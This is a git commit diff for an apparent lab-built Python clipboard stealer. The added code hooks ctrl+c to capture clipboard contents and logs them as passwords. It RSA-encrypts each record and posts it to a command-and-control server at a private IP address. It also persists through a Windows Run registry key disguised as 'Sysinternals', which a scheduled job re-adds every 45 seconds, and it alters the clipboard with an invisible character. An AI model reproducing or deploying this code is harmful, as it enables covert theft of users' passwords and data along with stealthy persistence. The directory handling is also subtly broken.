5607c349a8644db5b0c6e9416b7cef871f8d1403
besthero3 <57282024+besthero3@users.noreply.github.com>
2025-03-29 22:23:19 -0400

    C2 communication does not use local host anymore. Also now uses RSA encryption since packets had plaintext parts in wireshark. Server returns a random int instead of thanks. Now a file is created in the system on the server side and infected side. Records are transmitted one by one. An infected password file is still kept since it could be useful if access is lost to a system.

--- src/clipboard_copy_test.py
+++ src/clipboard_copy_test.py
@@ -1,14 +1,46 @@
+import os.path
+
 import pyperclip
 import requests
 import schedule
 import time
+
+from fontTools.merge.util import first
 from pynput import keyboard
 import keyboard
+import rsa
+import  winreg
+
+#TODO: EDIT BEFORE REPOSTING
+#invisible character idea is cool to fuck with clipboard!!!, makes it less obvious
+#Check how it looks in wireshark!!! - make sure password is encrypted...
+#check communication in vms
+#set up two VMS, add to network group, make sure it works between the two...
+#can do two openstack boxes, make sure to add them to same security group and set up the networking between them
+#NEED A NAME FOR THE TOOL
+
+public = rsa.PublicKey(
+        22801902741575260508046760451684121524343309971392815027806038442328813626689876929878295531764425101721113803279088975380306285103839798562486473563504890609732689910231035352994358600476885112341914819232866689789408515621209722745373194438974054762656866686749518758325281935986106093899741071523184790288397250570095386108667233843051192504696785064008214814463197996158290147894449246014411585018720395948432620796871823751561082698116083062968467223326531809351871820333024478963454054743945987929181103396110463090638025544498539475681820761973201801628104421055632663943101423395201694333712187265928179307257,
+        65537)
 
 def main():
 
+    location = winreg.HKEY_CURRENT_USER
+
+    #r is needed for backspacing characters
+    path = winreg.OpenKeyEx(location, r"Software\Microsoft\Windows\CurrentVersion\Run\\")
+    #first_key = winreg.CreateKey(path, "Discord")
+
+    current = os.path.abspath(__file__)
+    winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
+    #TODO: COULD ADD THE PERSISTENCE MECHANISM...
+    #
+
     #gets the clipboard information and puts it in a file every 90 seconds.
     schedule.every(90).seconds.do(get_clipboard_info)
+
+    #Reestablishes the persistence mechanisms
+    schedule.every(45).seconds.do(reestablish)
 
     #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
     #explore the timeout feature to add some more functionality
@@ -16,7 +48,7 @@ def main():
     keyboard.add_hotkey('ctrl+c', get_clipboard_info)
 
     #ctrl V ensures that the clipboard data is changed to password
-    keyboard.add_hotkey('ctrl+v', change_password)
+    keyboard.add_hotkey('ctrl+v', add_invisible_character_to_clipboard)
 
     #from https://schedule.readthedocs.io/en/stable/examples.html, schedule documentation
     #code handles the scheduled task
@@ -36,6 +68,7 @@ the clipboard file atatched.
 def get_clipboard_info():
     #have to define as a global because of how python scope works
     global last_clip_board_value
+    global public
 
     #need a delay here so that the ctrl+c copy updates the clipboard before the information is grabbed
     #if we do not have this delay: at the end of this method the clipboard info is changed to password
@@ -48,14 +81,28 @@ def get_clipboard_info():
     # paste, pastes text from clipboard
     clipboard_info = pyperclip.paste()
 
+    #TODO: make sure to create a filepath and put it somewhere...!!!!
+    #TODO: add persistence!!!
+
     # a appends data to file so the passwords can be stored over time password
-    clipboard_data_file = open("myfile.txt", "a")
+    filepath = os.path.join('C:/Tools/Sysint/MalTest', 'check')
+    if not os.path.exists('C:/Tools/Sysint/MalTest'):
+        #makes the directory if the path doesn't exist
+        os.makedirs('C:/passwordLog')
+
+    clipboard_data_file = open(filepath, "a")
+
 
     #checks if the last clipboard value is equal to the current one
     if not last_clip_board_value == clipboard_info:
+        #TODO: write it to a file, communicate line by line instead of sending the entire file each time
+
         #writes the clipboard value to the file along with a timestamp
         clipboard_data_file.write(clipboard_info + ' (' + time.asctime(time.localtime()) + ')')
         clipboard_data_file.write("\n")
+
+        formatted_clipboard_info = (clipboard_info + ' (' + time.asctime(time.localtime()) + ')').encode('utf8')
+        encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
 
         #closes the file to avoid issues with already being at the end of the file when trying to exfil the contents
         #of the file
@@ -65,7 +112,17 @@ def get_clipboard_info():
         exfil_file = open("myfile.txt", "r")
 
         #Posts the file to the server (currently local host), and assigns the file under the key: file
-        requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})
+        #requests.post("http://127.0.0.1:12345/output", files={'file': exfil_file})
+
+
+        #encoded_clipboard_info = rsa.encrypt(formatted_clipboard_info, public)
+
+        #TODO: THIS CAN BE SEEN IN WIRESHARK...
+
+        requests.post("http://10.168.3.254:80/output", encoded_clipboard_info)
+
+        #TODO: consider not storing a file of passwords
+        #TODO: reroute to the correct server...
 
     #if the last and current clipboard value match then close the file
     else:
@@ -74,11 +131,11 @@ def get_clipboard_info():
     #Updates the last clipboard value
     last_clip_board_value = clipboard_info
 
-    #changes the clipboard data to password
-    change_password()
+    #changes the clipboard data to the same word but with an invisible character at the end
+    add_invisible_character_to_clipboard()
 
 """
-add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character 
+add_invisible_character_to_clipboard takes the current clipboard_value and adds an invisible character takes takes
 to the end of it
 """
 def add_invisible_character_to_clipboard() -> None:
@@ -90,7 +147,20 @@ def add_invisible_character_to_clipboard() -> None:
 
     # copy - copies whatever text to the clipboard
     #in this case copies the current clipboard info plus an invisible character
-    pyperclip.copy(clipboard_info + invisible_character)
+
+    #could use endswith or in(java contains)
+    #if there is already an invisible character then we don't need another
+    if invisible_character in clipboard_info:
+        pyperclip.copy(clipboard_info)
+    else:
+        pyperclip.copy(clipboard_info + invisible_character)
+
+"""Reestablishes persistence mechanism once it gets deleted..."""
+def reestablish() -> None:
+    location = winreg.HKEY_CURRENT_USER
+    path = winreg.OpenKeyEx(location, r"Software\Microsoft\Windows\CurrentVersion\Run\\")
+    current = os.path.abspath(__file__)
+    winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
 
 """
 change_password changes the clipboard data to password
